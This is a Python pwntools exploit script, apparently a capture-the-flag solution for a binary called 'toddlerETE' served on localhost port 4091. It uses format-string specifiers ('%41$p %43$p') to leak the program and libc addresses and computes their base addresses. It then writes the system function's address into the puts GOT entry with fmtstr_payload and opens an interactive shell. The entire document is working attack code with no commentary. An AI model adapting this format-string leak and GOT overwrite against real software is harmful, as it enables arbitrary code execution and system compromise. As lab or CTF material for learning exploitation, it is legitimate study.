from pwn import * 

elf = ELF('./toddlerETE', checksec = False)
libc = ELF('./libc.so.6', checksec = False)
context.binary = elf

# p = elf.process()
p = remote("localhost", 4091)
p.sendlineafter(">> ", "/bin/sh")

p.sendlineafter("?\n", b"3") 

p.sendlineafter(">> ", "%41$p %43$p")
p.recvline()
data = p.recvline().split(b' ')
main = int(data[-1][:-1].decode(), 16)
libc_leak = int(data[-2].decode(), 16)

elf.address = main - elf.sym['main']

libc.address = libc_leak - (0x7f500a229d90 - 0x7f500a200000)
log.critical(f"elf @ {hex(elf.address)}")
log.critical(f"libc @ {hex(libc.address)}")
print(hex(elf.got['puts']))

p.sendlineafter(">> ", fmtstr_payload(12, {elf.got['puts'] : p64(libc.sym['system'])}, 0))

p.interactive()

